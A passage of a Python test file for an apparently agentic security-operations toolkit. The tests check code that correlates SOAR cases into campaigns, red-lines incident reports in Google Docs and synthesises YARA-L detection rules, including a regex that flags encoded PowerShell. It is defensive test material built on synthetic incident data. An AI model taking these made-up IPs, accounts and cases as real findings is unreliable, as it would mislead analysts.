    res2 = triage_and_redline_leaked_credentials_in_doc(
        "doc-h13-e2e",
        run_live_siem_check=True,
        redact_unredacted_credentials=True,
        synthesize_missing_revocation=True,
        siem_search_fn=fake_siem_search,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(lambda req: httpx.Response(200, json=mock_doc_pass2)),
    )
    assert res2["finding_count"] == 0
    assert res2["skipped_existing_suggestion_count"] == 5
    assert res2["comments"]["inserted_count"] == 0
    assert res2["edits"]["applied_count"] == 0

    # Verify Stage A integration in review_google_doc_with_stage_a
    batch_calls.clear()
    stage_a_res = review_google_doc_with_stage_a(
        "doc-h13-e2e",
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(handler),
    )
    assert stage_a_res["status"] == "success"
    assert stage_a_res["stage_a_credential_containment_count"] == 4
    assert stage_a_res["edits"]["applied_count"] == 4

    # Verify ADK FunctionTool schema declaration
    ft = FunctionTool(tools_module.triage_and_redline_leaked_credentials_in_doc)
    decl = ft._get_declaration()
    assert decl.name == "triage_and_redline_leaked_credentials_in_doc"
    props = (decl.parameters_json_schema or {}).get("properties", {})
    assert "document_id" in props
    assert "run_live_siem_check" in props
    assert "synthesize_missing_revocation" in props
    assert "tool_context" not in props


# ---------------------------------------------------------------------------
# Cycle 16 (H5): Cross-Case Campaign Graph & Claim-to-Evidence Grounding Auditor
# ---------------------------------------------------------------------------


def test_build_cross_case_campaign_graph_correlates_cases_hosts_principals_and_ips() -> None:
    """Verifies build_cross_case_campaign_graph correlates multi-case campaigns and shared entities."""
    from manager.tools.docs_review_tools import (
        CANONICAL_SOAR_CAMPAIGN_CATALOG,
        build_cross_case_campaign_graph,
    )

    full_graph = build_cross_case_campaign_graph()
    assert full_graph["total_campaigns"] == 3
    assert full_graph["total_cases"] == 7
    assert set(full_graph["campaigns"].keys()) == set(
        CANONICAL_SOAR_CAMPAIGN_CATALOG.keys()
    )
    assert full_graph["case_to_campaign"]["33269"] == "CAMP-WINS-D19-ENDPOINT"
    assert full_graph["case_to_campaign"]["33280"] == "CAMP-WINS-D19-ENDPOINT"
    assert full_graph["case_to_campaign"]["33285"] == "CAMP-WINS-D19-ENDPOINT"
    assert (
        full_graph["case_to_campaign"]["33281"]
        == "CAMP-WORKSPACE-SUPERADMIN-TAKEOVER"
    )
    assert (
        full_graph["case_to_campaign"]["33283"]
        == "CAMP-WORKSPACE-SUPERADMIN-TAKEOVER"
    )
    assert (
        full_graph["case_to_campaign"]["33287"]
        == "CAMP-WORKSPACE-SUPERADMIN-TAKEOVER"
    )
    assert full_graph["case_to_campaign"]["33278"] == "CAMP-GCP-CONTROL-PLANE-33278"

    assert full_graph["entity_to_cases"]["wins-d19"] == ["33269", "33280", "33285"]
    assert full_graph["entity_to_cases"]["79.154.246.114"] == [
        "33281",
        "33283",
        "33287",
    ]
    assert full_graph["entity_to_cases"]["104.198.226.161"] == ["33278"]
    assert full_graph["shared_entities"]["wins-d19"]["multi_case_pivot"] is True
    assert full_graph["shared_entities"]["79.154.246.114"]["multi_case_pivot"] is True

    # Scoped document referencing only Case 33269 on wins-d19 and Case 33287 on 79.154.246.114
    sample_doc = (
        "Incident Summary: Host wins-d19 triggered Case 33269 under user lisawalker.\n"
        "Identity Summary: Source IP 79.154.246.114 triggered SOAR Case 33287.\n"
    )
    scoped = build_cross_case_campaign_graph(sample_doc)
    assert set(scoped["referenced_campaign_ids"]) == {
        "CAMP-WINS-D19-ENDPOINT",
        "CAMP-WORKSPACE-SUPERADMIN-TAKEOVER",
    }
    wins_camp = scoped["campaigns"]["CAMP-WINS-D19-ENDPOINT"]
    assert wins_camp["matched_cases_in_doc"] == ["33269"]
    assert wins_camp["missing_sibling_cases_in_doc"] == ["33280", "33285"]
    ws_camp = scoped["campaigns"]["CAMP-WORKSPACE-SUPERADMIN-TAKEOVER"]
    assert ws_camp["matched_cases_in_doc"] == ["33287"]
    assert ws_camp["missing_sibling_cases_in_doc"] == ["33281", "33283"]


def test_find_claim_evidence_and_campaign_spans_repairs_contradicted_dispositions_and_siloed_cases() -> None:
    """Verifies exact UTF-16 span detection and replacement for contradicted dispositions and siloed case citations."""
    from manager.tools.docs_review_tools import (
        extract_doc_text_and_index_map,
        find_claim_evidence_and_campaign_spans,
    )

    doc_text = (
        "## Scenario 1: Workspace Identity Takeover\n"
        "Initial Tier-1 triage concluded that the SAML2 service provider deletion and 2-step verification changes "
        "by admin@mydomain.com from 79.154.246.114 in SOAR Case 33287 were a legitimate automated process.\n\n"
        "## Scenario 2: Endpoint Intrusion on wins-d19\n"
        "Endpoint containment was scoped exclusively to Case 33269 on workstation wins-d19 for user lisawalker.\n"
    )
    mock_doc = {
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {"content": doc_text},
                            }
                        ]
                    }
                }
            ]
        }
    }
    plain_text, index_map = extract_doc_text_and_index_map(mock_doc)
    comments, edits, findings = find_claim_evidence_and_campaign_spans(
        plain_text, index_map
    )

    issue_types = [f["issue_type"] for f in findings]
    assert "contradicted_analyst_disposition_claim" in issue_types
    assert "missing_cross_case_campaign_correlation" in issue_types
    assert len(findings) == 3

    disp_finding = next(
        f for f in findings if f["issue_type"] == "contradicted_analyst_disposition_claim"
    )
    assert disp_finding["campaign_id"] == "CAMP-WORKSPACE-SUPERADMIN-TAKEOVER"
    assert disp_finding["original_text"] == "a legitimate automated process"
    assert (
        "confirmed malicious Google Workspace Super Admin takeover"
        in disp_finding["replacement_text"]
    )
    assert (
        "[Evidence: SOAR Cases #33281, #33283, #33287"
        in disp_finding["replacement_text"]
    )

    silo_ws = next(
        f
        for f in findings
        if f["issue_type"] == "missing_cross_case_campaign_correlation"
        and f["campaign_id"] == "CAMP-WORKSPACE-SUPERADMIN-TAKEOVER"
    )
    assert silo_ws["original_text"] == "SOAR Case 33287"
    assert (
        silo_ws["replacement_text"]
        == "SOAR Cases 33281, 33283, and 33287 (Campaign CAMP-WORKSPACE-SUPERADMIN-TAKEOVER)"
    )

    silo_wins = next(
        f
        for f in findings
        if f["issue_type"] == "missing_cross_case_campaign_correlation"
        and f["campaign_id"] == "CAMP-WINS-D19-ENDPOINT"
    )
    assert silo_wins["original_text"] == "Case 33269"
    assert (
        silo_wins["replacement_text"]
        == "Cases 33269, 33280, and 33285 (Campaign CAMP-WINS-D19-ENDPOINT)"
    )

    # Verify non-overlapping UTF-16 spans
    assert len(comments) == len(edits) == len(findings)
    for i in range(len(edits)):
        for j in range(i + 1, len(edits)):
            a = (edits[i]["start_index"], edits[i]["end_index"])
            b = (edits[j]["start_index"], edits[j]["end_index"])
            assert max(a[0], b[0]) >= min(a[1], b[1])


def test_find_claim_evidence_and_campaign_spans_anchors_uncited_claims_with_zero_false_positives() -> None:
    """Verifies uncited forensic claims receive [Evidence: ...] anchors while well-cited control lines produce 0 findings."""
    from manager.tools.docs_review_tools import (
        extract_doc_text_and_index_map,
        find_claim_evidence_and_campaign_spans,
    )

    doc_text = (
        "## Scenario 3: Cloud Control Plane Escalation\n"
        "The attacker used 294955789222-compute@developer.gserviceaccount.com from 104.198.226.161 "
        "to execute SetIamPolicy granting roles/editor to hello@base-production.iam.gserviceaccount.com "
        "and deleted the prod-customers Cloud SQL instance.\n\n"
        "## Scenario 4: Well-Grounded Control Section\n"
        "Correlated SOAR Cases 33269, 33280, and 33285 (Campaign CAMP-WINS-D19-ENDPOINT) confirm "
        "PowerShell Empire execution and DERPService persistence on host wins-d19 "
        '[Evidence: SOAR Cases #33269, #33280, #33285 | UDM: principal.hostname = "wins-d19" | MITRE: T1059.001, T1543.003].\n'
    )
    mock_doc = {
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {"content": doc_text},
                            }
                        ]
                    }
                }
            ]
        }
    }
    plain_text, index_map = extract_doc_text_and_index_map(mock_doc)
    comments, edits, findings = find_claim_evidence_and_campaign_spans(
        plain_text, index_map
    )

    assert len(findings) == 1
    f = findings[0]
    assert f["issue_type"] == "uncited_analytical_claim"
    assert f["campaign_id"] == "CAMP-GCP-CONTROL-PLANE-33278"
    assert "SetIamPolicy" in f["original_text"]
    assert (
        "[Evidence: SOAR Case #33278 | UDM: SetIamPolicy (roles/editor), cloudsql.instances.delete (prod-customers)"
        in f["replacement_text"]
    )
    assert len(comments) == len(edits) == 1


def test_verify_claims_and_campaign_with_siem_executes_campaign_udm_queries() -> None:
    """Verifies verify_claims_and_campaign_with_siem deduplicates campaign UDM queries and extracts observed actions."""
    from manager.tools.docs_review_tools import verify_claims_and_campaign_with_siem

    findings = [
        {
            "issue_type": "contradicted_analyst_disposition_claim",
            "campaign_id": "CAMP-WORKSPACE-SUPERADMIN-TAKEOVER",
            "udm_validation_query": 'metadata.log_type = "WORKSPACE_ACTIVITY" AND principal.ip = "79.154.246.114"',
        },
        {
            "issue_type": "missing_cross_case_campaign_correlation",
            "campaign_id": "CAMP-WORKSPACE-SUPERADMIN-TAKEOVER",
            "udm_validation_query": 'metadata.log_type = "WORKSPACE_ACTIVITY" AND principal.ip = "79.154.246.114"',
        },
        {
            "issue_type": "missing_cross_case_campaign_correlation",
            "campaign_id": "CAMP-WINS-D19-ENDPOINT",
            "udm_validation_query": 'principal.hostname = "wins-d19"',
        },
        {
            "issue_type": "uncited_analytical_claim",
            "campaign_id": "CAMP-GCP-CONTROL-PLANE-33278",
            "udm_validation_query": 'metadata.log_type = "GCP_CLOUDAUDIT" AND principal.ip = "104.198.226.161"',
        },
    ]

    executed_queries: list[str] = []

    def fake_siem_search(
        query: str, start_time: str, end_time: str, max_events: int
    ) -> dict[str, Any]:
        executed_queries.append(query)
        if "79.154.246.114" in query:
            return {
                "status": "success",
                "events_matched": 30,
                "sample_events": [
                    {
                        "metadata": {"product_event_type": "DELETE_SAML2_SERVICE_PROVIDER_CONFIG"},
                        "principal": {"user": {"email_addresses": ["admin@mydomain.com"]}},
                    },
                    {
                        "metadata": {"product_event_type": "AUTHORIZE_API_CLIENT_ACCESS"},
                        "principal": {"user": {"email_addresses": ["bruce.wayne@the.org"]}},
                    },
                ],
            }
        if "wins-d19" in query:
            return {
                "status": "success",
                "events_matched": 25,
                "sample_events": [
                    {
                        "metadata": {"event_type": "PROCESS_LAUNCH"},
                        "principal": {"hostname": "wins-d19", "user": {"userid": "lisawalker"}},
                    }
                ],
            }
        return {
            "status": "success",
            "events_matched": 4,
            "sample_events": [
                {
                    "metadata": {"product_event_type": "SetIamPolicy"},
                    "principal": {
                        "user": {
                            "email_addresses": [
                                "294955789222-compute@developer.gserviceaccount.com"
                            ]
                        }
                    },
                },
                {
                    "metadata": {"product_event_type": "cloudsql.instances.delete"},
                },
            ],
        }

    results = verify_claims_and_campaign_with_siem(
        findings,
        siem_search_fn=fake_siem_search,
    )
    # Deduplicated: 4 findings across 3 distinct campaigns -> 3 SIEM queries
    assert len(executed_queries) == 3
    assert len(results) == 3
    by_camp = {r["campaign_id"]: r for r in results}
    assert by_camp["CAMP-WORKSPACE-SUPERADMIN-TAKEOVER"]["events_matched"] == 30
    assert (
        "DELETE_SAML2_SERVICE_PROVIDER_CONFIG"
        in by_camp["CAMP-WORKSPACE-SUPERADMIN-TAKEOVER"]["observed_actions"]
    )
    assert by_camp["CAMP-WINS-D19-ENDPOINT"]["events_matched"] == 25
    assert by_camp["CAMP-GCP-CONTROL-PLANE-33278"]["events_matched"] == 4
    assert (
        "SetIamPolicy"
        in by_camp["CAMP-GCP-CONTROL-PLANE-33278"]["observed_actions"]
    )
    assert (
        "[SIEM Campaign Evidence Verified:"
        in by_camp["CAMP-GCP-CONTROL-PLANE-33278"]["summary"]
    )


def test_audit_and_redline_claim_evidence_and_campaign_in_doc_end_to_end_and_idempotency() -> None:
    """Verifies end-to-end Google Docs campaign/claim red-lining, SIEM badge enrichment, descending edits, Pass 2 idempotency, Stage A integration, and ADK FunctionTool schema."""
    from google.adk.tools.function_tool import FunctionTool
    from manager.tools import tools as tools_module
    from manager.tools.docs_review_tools import (
        StaticTokenSource,
        audit_and_redline_claim_evidence_and_campaign_in_doc,
        review_google_doc_with_stage_a,
    )

    doc_text = (
        "## Scenario 1: Workspace Super Admin Takeover\n"
        "Initial Tier-1 triage concluded that the SAML2 service provider deletion and 2-step verification changes "
        "by admin@mydomain.com from 79.154.246.114 in SOAR Case 33287 were a legitimate automated process.\n\n"
        "## Scenario 2: Endpoint Intrusion on wins-d19\n"
        "Endpoint containment was scoped exclusively to Case 33269 on workstation wins-d19 for user lisawalker.\n\n"
        "## Scenario 3: Cloud Control Plane Escalation\n"
        "The attacker used 294955789222-compute@developer.gserviceaccount.com from 104.198.226.161 "
        "to execute SetIamPolicy granting roles/editor to hello@base-production.iam.gserviceaccount.com "
        "and deleted the prod-customers Cloud SQL instance.\n\n"
        "## Scenario 4: Well-Grounded Control Section\n"
        "Correlated SOAR Cases 33269, 33280, and 33285 (Campaign CAMP-WINS-D19-ENDPOINT) confirm "
        "PowerShell Empire execution and DERPService persistence on host wins-d19 "
        '[Evidence: SOAR Cases #33269, #33280, #33285 | UDM: principal.hostname = "wins-d19" | MITRE: T1059.001, T1543.003].\n'
    )
    mock_doc = {
        "documentId": "doc-h5-e2e",
        "title": "Cycle 16 H5 E2E Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {"content": doc_text},
                            }
                        ]
                    }
                }
            ]
        },
    }

    batch_calls: list[dict[str, Any]] = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=mock_doc)
        payload = json.loads(request.content.decode("utf-8"))
        batch_calls.append(payload)
        reqs = payload.get("requests", [])
        if reqs and "insertComment" in reqs[0]:
            return httpx.Response(
                200,
                json={
                    "replies": [
                        {"insertComment": {"commentId": f"c-h5-{idx}"}}
                        for idx in range(len(reqs))
                    ]
                },
            )
        return httpx.Response(200, json={"replies": [{} for _ in reqs]})

    def fake_siem_search(
        query: str, start_time: str, end_time: str, max_events: int
    ) -> dict[str, Any]:
        return {
            "status": "success",
            "events_matched": 12,
            "sample_events": [],
        }

    res1 = audit_and_redline_claim_evidence_and_campaign_in_doc(
        "doc-h5-e2e",
        run_live_siem_check=True,
        siem_search_fn=fake_siem_search,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(handler),
    )
    assert res1["status"] == "success"
    assert res1["finding_count"] == 4
    assert res1["skipped_existing_suggestion_count"] == 0
    assert res1["comments"]["inserted_count"] == 4
    assert res1["edits"]["applied_count"] == 4
    assert len(res1["siem_campaign_results"]) == 3
    assert len(batch_calls) == 2

    comment_bodies = [
        req["insertComment"]["content"] for req in batch_calls[0]["requests"]
    ]
    assert any(
        "[SIEM Campaign Evidence Verified:" in body for body in comment_bodies
    )

    delete_starts = [
        req["deleteContentRange"]["range"]["startIndex"]
        for req in batch_calls[1]["requests"]
        if "deleteContentRange" in req
    ]
    assert delete_starts == sorted(delete_starts, reverse=True)

    # Pass 2 idempotency when suggestions are already pending
    mock_doc_pass2 = {
        "documentId": "doc-h5-e2e",
        "title": "Cycle 16 H5 E2E Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {
                                    "content": doc_text,
                                    "suggestedDeletionIds": ["suggest.h5.existing"],
                                },
                            }
                        ]
                    }
                }
            ]
        },
    }
    res2 = audit_and_redline_claim_evidence_and_campaign_in_doc(
        "doc-h5-e2e",
        run_live_siem_check=True,
        siem_search_fn=fake_siem_search,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(
            lambda req: httpx.Response(200, json=mock_doc_pass2)
        ),
    )
    assert res2["finding_count"] == 0
    assert res2["skipped_existing_suggestion_count"] == 4
    assert res2["comments"]["inserted_count"] == 0
    assert res2["edits"]["applied_count"] == 0

    # Verify Stage A integration when include_claim_campaign_stage_a=True
    batch_calls.clear()
    stage_a_res = review_google_doc_with_stage_a(
        "doc-h5-e2e",
        include_claim_campaign_stage_a=True,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(handler),
    )
    assert stage_a_res["status"] == "success"
    assert stage_a_res["stage_a_claim_campaign_count"] == 4
    assert stage_a_res["edits"]["applied_count"] == 4

    # Verify ADK FunctionTool schema declaration
    ft = FunctionTool(
        tools_module.audit_and_redline_claim_evidence_and_campaign_in_doc
    )
    decl = ft._get_declaration()
    assert decl.name == "audit_and_redline_claim_evidence_and_campaign_in_doc"
    props = (decl.parameters_json_schema or {}).get("properties", {})
    assert "document_id" in props
    assert "run_live_siem_check" in props
    assert "tool_context" not in props


def test_build_detection_coverage_gap_matrix_identifies_covered_and_uncovered_tdos() -> None:
    """Verifies that build_detection_coverage_gap_matrix cross-references in-scope SOAR
    campaign TDOs against YARA-L 2.0 rules present in the document."""
    from manager.tools.docs_review_tools import build_detection_coverage_gap_matrix

    doc_text = (
        "# Incident Postmortem & Detection Coverage Matrix\n"
        "Scope: SOAR Case 33278, Case 33287, Case 33269, and Case 33280.\n\n"
        "rule tdo_gcp_iam_setiampolicy_case_33278 {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        '    mitre_attack_technique = "T1098.003"\n'
        '    runbook_skill = "compromised-user-account-response"\n'
        "  events:\n"
        '    $e.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $e.metadata.product_event_type = "SetIamPolicy"\n'
        '    $e.target.resource.name = "projects/base-production"\n'
        '    $e.principal.ip = "104.198.226.161"\n'
        "  condition:\n"
        "    $e\n"
        "}\n\n"
        "rule tdo_wins_d19_powershell_empire_case_33269 {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        '    mitre_attack_technique = "T1059.001"\n'
        '    runbook_skill = "malware-incident-response"\n'
        "  events:\n"
        '    $e.metadata.event_type = "PROCESS_LAUNCH"\n'
        '    $e.principal.hostname = "wins-d19"\n'
        "    re.regex($e.target.process.command_line, `.*powershell.*-(e|en|enc|encodedcommand).*`) nocase\n"
        "  condition:\n"
        "    $e\n"
        "}\n"
    )
    matrix = build_detection_coverage_gap_matrix(doc_text)
    assert matrix["total_tdo_count"] == 5
    assert matrix["covered_tdo_count"] == 2
    assert matrix["uncovered_tdo_count"] == 3
    assert matrix["coverage_percentage"] == 40.0
    assert matrix["covered_tdo_ids"] == [
        "TDO-GCP-IAM-SETIAMPOLICY",
        "TDO-WINS-D19-POWERSHELL-EMPIRE",
    ]
    assert matrix["uncovered_tdo_ids"] == [
        "TDO-GCP-CLOUDSQL-DELETE",
        "TDO-WORKSPACE-SAML-2SV-TAMPER",
        "TDO-WINS-D19-DERPSERVICE-PERSISTENCE",
    ]
    assert "| TDO ID | Campaign | SOAR Cases | MITRE ATT&CK | Required Log Type | Coverage Status | Covering Rules | Runbook Skill |" in matrix["coverage_matrix_markdown"]
    assert "| `TDO-GCP-IAM-SETIAMPOLICY` |" in matrix["coverage_matrix_markdown"]
    assert "| `TDO-GCP-CLOUDSQL-DELETE` |" in matrix["coverage_matrix_markdown"]
    assert "`UNCOVERED_GAP`" in matrix["coverage_matrix_markdown"]


def test_find_detection_coverage_and_tdo_spans_flags_overclaimed_coverage_and_wrong_log_types() -> None:
    """Verifies overclaimed_detection_coverage and tdo_log_source_mismatch span detection
    with zero false positives on covered TDOs."""
    from manager.tools.docs_review_tools import (
        _build_utf16_index_map,
        find_detection_coverage_and_tdo_spans,
    )

    doc_text = (
        "# Detection Coverage Review (SOAR Case 33278, Case 33287, Case 33269, Case 33280)\n"
        "Executive Summary: We have achieved 100% detection coverage across all campaign techniques.\n\n"
        "- TDO-GCP-IAM-SETIAMPOLICY (MITRE T1098.003): Log Source: GCP_CLOUDAUDIT | Coverage Status: COVERED by rule tdo_gcp_iam_setiampolicy_case_33278.\n"
        "- TDO-GCP-CLOUDSQL-DELETE (MITRE T1485): Cloud SQL prod-customers deletion. Log Source: AWS_CLOUDTRAIL | Coverage Status: COVERED | Action Item: Write YARA-L 2.0 rule for cloudsql.instances.delete.\n"
        "- TDO-WORKSPACE-SAML-2SV-TAMPER (MITRE T1556.006): SAML2 IdP deletion and 2SV weakening. Log Source: GCP_CLOUDAUDIT | Action Item: Implement YARA-L 2.0 rule for DELETE_SAML2_SERVICE_PROVIDER_CONFIG.\n\n"
        "rule tdo_gcp_iam_setiampolicy_case_33278 {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        '    mitre_attack_technique = "T1098.003"\n'
        '    runbook_skill = "compromised-user-account-response"\n'
        "  events:\n"
        '    $e.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $e.metadata.product_event_type = "SetIamPolicy"\n'
        '    $e.target.resource.name = "projects/base-production"\n'
        '    $e.principal.ip = "104.198.226.161"\n'
        "  condition:\n"
        "    $e\n"
        "}\n\n"
        "rule tdo_wins_d19_powershell_empire_case_33269 {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        '    mitre_attack_technique = "T1059.001"\n'
        '    runbook_skill = "malware-incident-response"\n'
        "  events:\n"
        '    $e.metadata.event_type = "PROCESS_LAUNCH"\n'
        '    $e.principal.hostname = "wins-d19"\n'
        "    re.regex($e.target.process.command_line, `.*powershell.*-(e|en|enc|encodedcommand).*`) nocase\n"
        "  condition:\n"
        "    $e\n"
        "}\n"
    )
    idx_map = _build_utf16_index_map(doc_text)
    comments, edits, findings = find_detection_coverage_and_tdo_spans(
        doc_text, idx_map, synthesize_missing_tdo_rules=False
    )

    overclaimed = [f for f in findings if f["defect_type"] == "overclaimed_detection_coverage"]
    assert len(overclaimed) == 2
    assert overclaimed[0]["quote"] == "100% detection coverage across all campaign techniques"
    assert "Coverage Status: PARTIAL (2/5 TDOs covered, 40.0%)" in overclaimed[0]["replacement"]
    assert overclaimed[1]["tdo_id"] == "TDO-GCP-CLOUDSQL-DELETE"
    assert overclaimed[1]["quote"] == "Coverage Status: COVERED"
    assert overclaimed[1]["replacement"] == "Coverage Status: UNCOVERED GAP (TDO-GCP-CLOUDSQL-DELETE / T1485)"

    log_mismatches = [f for f in findings if f["defect_type"] == "tdo_log_source_mismatch"]
    assert len(log_mismatches) == 2
    assert [(f["tdo_id"], f["quote"], f["replacement"]) for f in log_mismatches] == [
        ("TDO-GCP-CLOUDSQL-DELETE", "AWS_CLOUDTRAIL", "GCP_CLOUDAUDIT"),
        ("TDO-WORKSPACE-SAML-2SV-TAMPER", "GCP_CLOUDAUDIT", "WORKSPACE_ACTIVITY"),
    ]

    # Zero false positives on covered TDO-GCP-IAM-SETIAMPOLICY
    assert all(f["tdo_id"] != "TDO-GCP-IAM-SETIAMPOLICY" for f in findings)

    # Non-overlapping edit spans
    sorted_edits = sorted(edits, key=lambda e: e["start_index"])
    for prev_e, next_e in zip(sorted_edits, sorted_edits[1:]):
        assert prev_e["end_index"] <= next_e["start_index"]


def test_find_detection_coverage_and_tdo_spans_synthesizes_compiler_valid_yaral2_rules() -> None:
    """Verifies that uncovered_tdo_rule_synthesis stages complete YARA-L 2.0 rules with
    zero static or meta lint defects."""
    from manager.tools.docs_review_tools import (
        _build_utf16_index_map,
        find_detection_coverage_and_tdo_spans,
        find_yaral2_rule_spans,
    )

    doc_text = (
        "# Detection Coverage Matrix (Case 33278, Case 33287, Case 33269, Case 33280)\n"
        "- TDO-GCP-CLOUDSQL-DELETE (MITRE T1485): Log Source: AWS_CLOUDTRAIL | Coverage Status: COVERED | Action Item: Write YARA-L 2.0 rule for cloudsql.instances.delete.\n"
        "- TDO-WORKSPACE-SAML-2SV-TAMPER (MITRE T1556.006): Log Source: GCP_CLOUDAUDIT | Action Item: Write YARA-L 2.0 rule for SAML2 IdP deletion and 2SV weakening.\n"
        "- TDO-WINS-D19-DERPSERVICE-PERSISTENCE (MITRE T1543.003): Action Item: Write YARA-L 2.0 rule for DERPService.exe service persistence.\n"
    )
    idx_map = _build_utf16_index_map(doc_text)
    comments, edits, findings = find_detection_coverage_and_tdo_spans(
        doc_text, idx_map, synthesize_missing_tdo_rules=True
    )

    synth_findings = [
        f for f in findings if f["defect_type"] == "uncovered_tdo_rule_synthesis"
    ]
    assert [f["tdo_id"] for f in synth_findings] == [
        "TDO-GCP-CLOUDSQL-DELETE",
        "TDO-WORKSPACE-SAML-2SV-TAMPER",
        "TDO-WINS-D19-DERPSERVICE-PERSISTENCE",
    ]
    for sf in synth_findings:
        rule_text = sf["synthesized_rule_text"]
        assert f"rule {sf['synthesized_rule_name']} {{" in rule_text
        assert "meta:" in rule_text
        assert "mitre_attack_technique =" in rule_text
        assert "mitre_attack_tactic =" in rule_text
        assert "mitre_attack_url =" in rule_text
        assert "severity =" in rule_text
        assert "runbook_skill =" in rule_text
        assert "events:" in rule_text
        assert "outcome:" in rule_text
        assert "$risk_score = max(" in rule_text
        assert "condition:\n    $e" in rule_text

        rule_idx = _build_utf16_index_map(rule_text)
        _, _, rule_defects = find_yaral2_rule_spans(
            rule_text,
            rule_idx,
            verify_meta_mitre=True,
            synthesize_missing_meta=True,
            verify_meta_runbook=True,
            verify_meta_severity=True,
            synthesize_missing_runbook=True,
        )
        assert rule_defects == []

    # Verify non-overlapping spans even when a single TDO line has 3 defects
    sorted_edits = sorted(edits, key=lambda e: e["start_index"])
    for prev_e, next_e in zip(sorted_edits, sorted_edits[1:]):
        assert prev_e["end_index"] <= next_e["start_index"]


def test_analyze_and_redline_detection_coverage_gaps_in_doc_end_to_end_and_idempotency() -> None:
    """Verifies end-to-end analyze_and_redline_detection_coverage_gaps_in_doc execution,
    SIEM compilation + retrohunt enrichment, 100% post-accept coverage, Pass 2 idempotency,
    and ADK FunctionTool schema declaration."""
    import json
    import httpx
    from google.adk.tools.function_tool import FunctionTool
    from skills.drive_registry import StaticTokenSource
    from manager.tools.docs_review_tools import (
        analyze_and_redline_detection_coverage_gaps_in_doc,
        build_detection_coverage_gap_matrix,
    )
    from manager.tools import tools as tools_module

    doc_text = (
        "# Multi-Campaign Incident Postmortem & Detection Coverage Matrix\n"
        "Campaign Scope: SOAR Case 33278, Case 33287, Case 33269, and Case 33280.\n"
        "Executive Coverage Claim: We have achieved 100% detection coverage across all campaign techniques.\n\n"
        "## Existing YARA-L 2.0 Rules\n"
        "rule tdo_gcp_iam_setiampolicy_case_33278 {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        '    mitre_attack_technique = "T1098.003"\n'
        '    runbook_skill = "compromised-user-account-response"\n'
        "  events:\n"
        '    $e.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $e.metadata.product_event_type = "SetIamPolicy"\n'
        '    $e.target.resource.name = "projects/base-production"\n'
        '    $e.principal.ip = "104.198.226.161"\n'
        "  condition:\n"
        "    $e\n"
        "}\n\n"
        "rule tdo_wins_d19_powershell_empire_case_33269 {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        '    mitre_attack_technique = "T1059.001"\n'
        '    runbook_skill = "malware-incident-response"\n'
        "  events:\n"
        '    $e.metadata.event_type = "PROCESS_LAUNCH"\n'
        '    $e.principal.hostname = "wins-d19"\n'
        "    re.regex($e.target.process.command_line, `.*powershell.*-(e|en|enc|encodedcommand).*`) nocase\n"
        "  condition:\n"
        "    $e\n"
        "}\n\n"
        "## Threat Detection Opportunities (TDOs)\n"
        "- TDO-GCP-IAM-SETIAMPOLICY (MITRE T1098.003): Log Source: GCP_CLOUDAUDIT | Coverage Status: COVERED.\n"
        "- TDO-GCP-CLOUDSQL-DELETE (MITRE T1485): Cloud SQL prod-customers deletion. Log Source: AWS_CLOUDTRAIL | Coverage Status: COVERED | Action Item: Write YARA-L 2.0 rule for cloudsql.instances.delete.\n"
        "- TDO-WORKSPACE-SAML-2SV-TAMPER (MITRE T1556.006): SAML2 IdP deletion and 2SV weakening. Log Source: GCP_CLOUDAUDIT | Action Item: Write YARA-L 2.0 rule for DELETE_SAML2_SERVICE_PROVIDER_CONFIG.\n"
        "- TDO-WINS-D19-POWERSHELL-EMPIRE (MITRE T1059.001): Log Source: WINDOWS_SYSMON | Coverage Status: COVERED.\n"
        "- TDO-WINS-D19-DERPSERVICE-PERSISTENCE (MITRE T1543.003): Windows service persistence on wins-d19. Action Item: Write YARA-L 2.0 rule for DERPService.exe.\n"
    )

    mock_doc = {
        "documentId": "doc-h8-e2e",
        "title": "Cycle 17 H8 E2E Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {"content": doc_text},
                            }
                        ]
                    }
                }
            ]
        },
    }
    batch_calls: list[dict[str, Any]] = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=mock_doc)
        payload = json.loads(request.content.decode("utf-8"))
        batch_calls.append(payload)
        reqs = payload.get("requests", [])
        if reqs and "insertComment" in reqs[0]:
            return httpx.Response(
                200,
                json={
                    "replies": [
                        {"insertComment": {"commentId": f"c-h8-{i+1}"}}
                        for i in range(len(reqs))
                    ]
                },
            )
        return httpx.Response(200, json={"replies": [{} for _ in reqs]})

    def fake_validate(rule_text: str) -> dict[str, Any]:
        return {"status": "success", "valid": True, "message": "SUCCESS"}

    def fake_search(
        query: str, start_time: str, end_time: str, max_events: int
    ) -> dict[str, Any]:
        return {"status": "success", "events_matched": 3, "sample_events": []}

    res1 = analyze_and_redline_detection_coverage_gaps_in_doc(
        "doc-h8-e2e",
        run_live_siem_check=True,
        synthesize_missing_tdo_rules=True,
        siem_validate_fn=fake_validate,
